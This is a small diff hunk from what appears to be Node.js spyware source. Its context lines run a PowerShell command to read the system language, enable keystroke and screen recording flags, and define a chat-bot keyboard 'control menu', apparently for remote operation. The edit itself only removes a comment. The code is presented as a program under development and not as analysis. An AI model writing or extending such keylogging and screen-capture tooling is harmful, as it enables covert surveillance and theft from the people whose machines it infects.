@@ -42,7 +42,7 @@ exec('powershell -NoProfile -Command "(Get-Culture).TwoLetterISOLanguageName"', 
 let isRecordingKeys = true;
 let isRecordingScreen = true;
 
-// --- 🎮 CLICKABLE CONTROL MENU ---
+
 const controlMenu = {
     reply_markup: {
         keyboard: [
